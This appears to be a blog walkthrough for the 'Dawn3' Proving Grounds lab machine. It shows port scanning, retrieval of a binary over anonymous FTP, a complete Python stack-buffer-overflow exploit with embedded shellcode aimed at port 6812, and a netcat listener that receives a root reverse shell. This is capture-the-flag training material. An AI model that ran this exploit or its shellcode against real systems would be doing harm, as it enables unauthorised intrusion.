@@ -1,0 +1,79 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="map[name:d42kw01f]"><meta name=description content="Proving Grounds Play Dawn3 Writeup|Walkthrough"><meta name=keywords content="cyber security,malware reverse engineering,pen test,CTF,PG-play,Buffer Overflow,OSCP"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://d42kw01f.github.io/wr1t3up/dawn3/><title>Dawn3 - PG Play :: d42kw01f</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=https://d42kw01f.github.io/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css><link rel=apple-touch-icon sizes=180x180 href=https://d42kw01f.github.io/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://d42kw01f.github.io/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://d42kw01f.github.io/favicon-16x16.png><link rel=manifest href=https://d42kw01f.github.io/site.webmanifest><link rel=mask-icon href=https://d42kw01f.github.io/safari-pinned-tab.svg color><link rel="shortcut icon" href=https://d42kw01f.github.io/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="Dawn3 - PG Play"><meta itemprop=description content="Proving Grounds Play Dawn3 Writeup|Walkthrough"><meta itemprop=datePublished content="2021-12-20T00:00:00+00:00"><meta itemprop=dateModified content="2021-12-20T00:00:00+00:00"><meta itemprop=wordCount content="478"><meta itemprop=image content="https://d42kw01f.github.io/img/image.jpg"><meta itemprop=keywords content="CTF,PG-play,Buffer Overflow,OSCP,"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://d42kw01f.github.io/img/image.jpg"><meta name=twitter:title content="Dawn3 - PG Play"><meta name=twitter:description content="Proving Grounds Play Dawn3 Writeup|Walkthrough"><meta property="og:title" content="Dawn3 - PG Play"><meta property="og:description" content="Proving Grounds Play Dawn3 Writeup|Walkthrough"><meta property="og:type" content="article"><meta property="og:url" content="https://d42kw01f.github.io/wr1t3up/dawn3/"><meta property="og:image" content="https://d42kw01f.github.io/img/image.jpg"><meta property="article:section" content="wr1t3up"><meta property="article:published_time" content="2021-12-20T00:00:00+00:00"><meta property="article:modified_time" content="2021-12-20T00:00:00+00:00"><meta property="og:see_also" content="https://d42kw01f.github.io/wr1t3up/hutch/"><meta property="og:see_also" content="https://d42kw01f.github.io/wr1t3up/billyboy/"><meta property="og:see_also" content="https://d42kw01f.github.io/wr1t3up/planetexpress/"><meta property="article:section" content="PG-play"><meta property="article:section" content="BufferOverflow"><meta property="article:published_time" content="2021-12-20 00:00:00 +0000 UTC"></head><body><div class=container><header class=header><span class=header__inner><a href=https://d42kw01f.github.io/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
+<span class=logo__text>$ cd ~</span>
+<span class=logo__cursor style=background-color:#67a2c9></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://d42kw01f.github.io/wr1t3up/>1.wr1t3up</a></li><li><a href=https://d42kw01f.github.io/m4lwar3/>2.m4lwar3</a></li><li><a href=https://d42kw01f.github.io/0th3r/>3.0th3r</a></li><li><a href=https://d42kw01f.github.io/about/>4b0ut M3</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><h2 class=post-title><a href=https://d42kw01f.github.io/wr1t3up/dawn3/>Dawn3 - PG Play</a></h2><div class=post-content><hr><h2 id=summary>Summary</h2><blockquote><p>This machine is exploited via a vulnerable custom server that suffers from a stack-based buffer overflow. The attacker obtains a copy of the binary from an anonymous FTP server. After successful analysis and exploitation of the vulnerable binary, a root shell is obtained.</p></blockquote><h2 id=enumeration>Enumeration</h2><h3 id=nmap>Nmap:</h3><p>We start off by running a <code>nmap</code> scan against all TCP ports:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -p- 192.168.120.72
+</span></span></code></pre></div><pre tabindex=0><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-16 15:52 EDT
+Nmap scan report for 192.168.120.72
+Host is up (0.029s latency).
+PORT STATE SERVICE
+2100/tcp open amiganetfs
+6812/tcp open unknown
+</code></pre><p>According to the <code>nmap</code> there are two ports are opened in the machine. The port <code>2100</code> is most likely to be a <code>FTP server</code> and other ports is unknown for the <code>nmap</code>.</p><h4 id=port-2100-enumeration>Port <code>2100</code> Enumeration:</h4><p>An anonymous FTP server is running on port 2100. After we connect (the password is blank), we are able to retrieve a copy of the custom server that is running on port 6812:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ftp 192.168.120.72 <span style=color:#ae81ff>2100</span>
+</span></span></code></pre></div><pre tabindex=0><code>Connected to 192.168.120.72.
+220 pyftpdlib 1.5.6 ready.
+Name (192.168.120.72:root): anonymous
+331 Username ok, send password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 Active data connection established.
+125 Data connection already open. Transfer starting.
+-rwsrwxrwx 1 dawn3 dawn3 292728 Mar 08 18:22 dawn3.exe
+226 Transfer complete.
+</code></pre><p>There is an executable file called <code>dawn3.exe</code> can be found in the <code>ftp</code>. Let&rsquo;s Download the executable to the local machine for further enumeration.</p><pre tabindex=0><code>ftp&gt; get dawn3.exe
+local: dawn3.exe remote: dawn3.exe
+200 Active data connection established.
+125 Data connection already open. Transfer starting.
+226 Transfer complete.
+292728 bytes received in 0.15 secs (1.8161 MB/s)
+ftp&gt; bye
+221 Goodbye.
+</code></pre><h2 id=exploitation>Exploitation</h2><p>The custom server, running on port 6812 is vulnerable to a stack-based buffer
+overflow. Given a copy of the server, we can develop a proof-of-concept python
+script that would exploit the vulnerable server for us. The PoC script is as
+follows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python2</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> socket
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> struct
+</span></span><span style=display:flex><span>size <span style=color:#f92672>=</span> <span style=color:#ae81ff>524</span>
+</span></span><span style=display:flex><span>host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;192.168.239.13&#34;</span>
+</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>=</span> (<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xb8\xf6\x34\xd5\xa8\xdb\xc3\xd9\x74\x24\xf4\x5f\x31\xc9\xb1</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x12\x31\x47\x12\x03\x47\x12\x83\x31\x30\x37\x5d\x8c\xe2\x40</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x7d\xbd\x57\xfc\xe8\x43\xd1\xe3\x5d\x25\x2c\x63\x0e\xf0\x1e</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x5b\xfc\x82\x16\xdd\x07\xea\xa2\x16\xf8\xee\xda\x2a\xf8\xef</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xa1\xa2\x19\x5f\xb3\xe4\x88\xcc\x8f\x06\xa2\x13\x22\x88\xe6</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xbb\xd3\xa6\x75\x53\x44\x96\x56\xc1\xfd\x61\x4b\x57\xad\xf8</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x6d\xe7\x5a\x36\xed</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>filler <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> size
+</span></span><span style=display:flex><span>eip <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x13\x15\x50\x52</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>offset <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;C&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>nops <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>10</span>
+</span></span><span style=display:flex><span>inputBuffer <span style=color:#f92672>=</span> filler <span style=color:#f92672>+</span> eip <span style=color:#f92672>+</span> offset <span style=color:#f92672>+</span> nops <span style=color:#f92672>+</span> shellcode
+</span></span><span style=display:flex><span>print <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Sending evil buffer with </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> bytes&#34;</span> <span style=color:#f92672>%</span> size
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>s <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
+</span></span><span style=display:flex><span>s<span style=color:#f92672>.</span>connect((host, <span style=color:#ae81ff>6812</span>))
+</span></span><span style=display:flex><span>print <span style=color:#e6db74>&#34;[*] Sending Payload!&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>s<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span>inputBuffer)
+</span></span><span style=display:flex><span>s<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print <span style=color:#e6db74>&#34;[*] Done!!!&#34;</span>
+</span></span></code></pre></div><p>After we set up a <code>netcat</code> listener on port 4444, we can send the malicious payload
+to the server and catch a reverse shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python poc.py 192.168.120.72
+</span></span></code></pre></div><pre tabindex=0><code>[*] Sending Payload!
+</code></pre><p>Let&rsquo;s start the reverse shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc -lvnp <span style=color:#ae81ff>4444</span>
+</span></span></code></pre></div><pre tabindex=0><code>listening on [any] 4444 ...
+192.168.120.72: inverse host lookup failed: Unknown host
+connect to [192.168.118.3] from (UNKNOWN) [192.168.120.72] 53004
+python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+root@dawn3:/root# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><h2 id=escalation>Escalation:</h2><p>As we already have a root shell, no further privilege escalation is required.</p></div></article><hr><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://d42kw01f.github.io/tags/ctf/>CTF</a></span>
+<span class=tag><a href=https://d42kw01f.github.io/tags/pg-play/>PG-play</a></span>
+<span class=tag><a href=https://d42kw01f.github.io/tags/buffer-overflow/>Buffer Overflow</a></span>
+<span class=tag><a href=https://d42kw01f.github.io/tags/oscp/>OSCP</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg><span class=tag><a href=https://d42kw01f.github.io/categories/pg-play/>PG-play</a></span>
+<span class=tag><a href=https://d42kw01f.github.io/categories/bufferoverflow/>BufferOverflow</a></span></p></div></main></div><footer class=footer><div class=footer__inner><div class=footer__content><span>RGFrc2hpdGhhIFBlcmVyYQo=</span></div></div></footer></div><script type=text/javascript src=https://d42kw01f.github.io/bundle.min.feebdc8d801e3fb1791305e362b6d11557f029604dd5b3c27e2686bc88787ee90ae1ccf0afe81bd7d959d7617cfe1fc73062aa82b4e1fa830d6941193d2cbddf.js integrity="sha512-/uvcjYAeP7F5EwXjYrbRFVfwKWBN1bPCfiaGvIh4fukK4czwr+gb19lZ12F8/h/HMGKqgrTh+oMNaUEZPSy93w=="></script></body></html>
